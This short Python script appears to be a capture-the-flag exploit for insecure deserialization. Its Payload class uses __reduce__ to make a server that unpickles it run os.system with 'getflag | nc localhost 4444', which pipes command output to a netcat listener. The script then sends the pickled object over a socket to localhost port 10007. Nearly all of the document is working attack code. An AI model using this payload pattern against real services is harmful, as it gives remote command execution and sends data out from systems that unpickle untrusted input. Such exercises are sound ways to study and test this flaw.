import cPickle
import base64                                                                                                                           
import socket                                                                                                                           
import pickle                                                                                                                           
import os
                                                                                                                                        
class Payload(object):
    def __reduce__(self):
        #return (subprocess.Popen, (('getflag | nc localhost 4444'),))
        return (os.system, (('getflag | nc localhost 4444'),))

print(base64.b64encode(cPickle.dumps(Payload())))
print(cPickle.dumps(Payload()))


HOST = 'localhost'
PORT = 10007
# Create a socket connection.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Create an instance of ProcessData() to send to server.
variable = Payload()
# Pickle the object and send it to the server
data_string = pickle.dumps(variable)
s.send(data_string)
#s.send(base64.b64encode(data_string))
reply = s.recv(1024)

print(reply)
print ('Data Sent to Server')
